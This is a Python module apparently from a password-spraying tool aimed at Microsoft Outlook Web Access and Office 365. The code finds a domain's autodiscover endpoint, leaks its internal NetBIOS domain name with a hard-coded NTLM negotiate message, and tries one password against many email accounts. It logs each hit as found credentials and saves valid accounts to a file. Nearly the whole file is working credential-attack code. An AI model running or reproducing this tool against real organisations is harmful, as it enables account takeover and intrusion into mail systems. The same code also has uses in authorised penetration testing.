import logging
import requests
from requests_ntlm import HttpNtlmAuth
from requests.exceptions import ConnectionError
from core.utils.ntlmdecoder import ntlmdecode
from core.utils.messages import *


class OWA:
    def __init__(self, domain, password):
        self.domain = domain
        self.password = password
        self.log = logging.getLogger('owasprayer')
        self.valid_accounts = set()
        self.autodiscover_url = None
        self.netbios_domain = None
        self.O365 = False

        self.recon()

    def recon(self):
        self.autodiscover_url = self.get_autodiscover_url(self.domain)
        self.log.info(print_good(f"Using OWA autodiscover URL: {self.autodiscover_url}"))

        # https://github.com/sensepost/ruler/blob/master/ruler.go#L125
        o365_owa_url = f"https://login.microsoftonline.com/{self.domain}/.well-known/openid-configuration"
        r = requests.get(o365_owa_url, verify=False)
        if r.status_code == 400:
            self.log.info(print_good("OWA domain appears to be hosted internally"))
        elif r.status_code == 200:
            self.log.info(print_info("OWA domain appears to be hosted on Office365"))
            self.O365 = True

        # Stolen from https://github.com/dafthack/MailSniper
        #try:
        self.netbios_domain = self.get_owa_domain(self.autodiscover_url)
        self.log.info(print_good(f"Got internal domain name using OWA: {self.netbios_domain}"))
        #except Exception as e:
            #self.log.error(print_bad(f"Couldn't get domain from OWA autodiscover URL: {e}"))

            #self.netbios_domain = self.get_owa_domain(f"https://autodiscover.{self.domain}/EWS/Exchange.asmx")
            #self.log.info(print_good(f"Got internal domain name using EWS: {self.netbios_domain}"))

    def shutdown(self):
        with open('owa_valid_accounts.txt', 'a+') as account_file:
            for email in self.valid_accounts:
                account_file.write(email + '\n')

        self.log.info(print_good(f"Dumped {len(self.valid_accounts)} valid accounts to owa_valid_accounts.txt"))

    def get_owa_domain(self, url):
        # Stolen from https://github.com/dafthack/MailSniper
        auth_header = {"Authorization": "NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw=="}
        r = requests.post(url, headers=auth_header, verify=False)
        if r.status_code == 401:
            ntlm_info = ntlmdecode(r.headers["WWW-Authenticate"])

        return ntlm_info["NetBIOS_Domain_Name"]

    def get_autodiscover_url(self, domain):
        urls = [
            f"https://autodiscover.{domain}/autodiscover/autodiscover.xml",
            f"http://autodiscover.{domain}/autodiscover/autodiscover.xml",
            f"https://{domain}/autodiscover/autodiscover.xml",
        ]

        headers = {"Content-Type": "text/xml"}
        for url in urls:
            try:
                r = requests.get(url, headers=headers, verify=False)
                if r.status_code == 401 or r.status_code == 403:
                    return url
            except ConnectionError:
                continue

    def auth_O365(self, email):
        log = logging.getLogger(f"auth_owa_O365({email})")

        headers = {"Content-Type": "text/xml"}
        r = requests.get("https://autodiscover-s.outlook.com/autodiscover/autodiscover.xml", auth=(email, self.password), verify=False)
        if r.status_code == 200:
            log.info(print_good(f"Found credentials: {email}:{self.password}"))
        else:
            log.info(print_bad(f"Authentication failed: {email}:{self.password} (Invalid credentials)"))

    def auth(self, email):
        log = logging.getLogger(f"auth_owa({email})")

        headers = {"Content-Type": "text/xml"}
        r = requests.get(self.autodiscover_url, auth=HttpNtlmAuth(f'{self.netbios_domain}\\{email}', self.password), verify=False)
        if r.status_code == 200:
            log.info(print_good(f"Found credentials: {email}:{self.password}"))
        else:
            log.info(print_bad(f"Authentication failed: {email}:{self.password} (Invalid credentials)"))
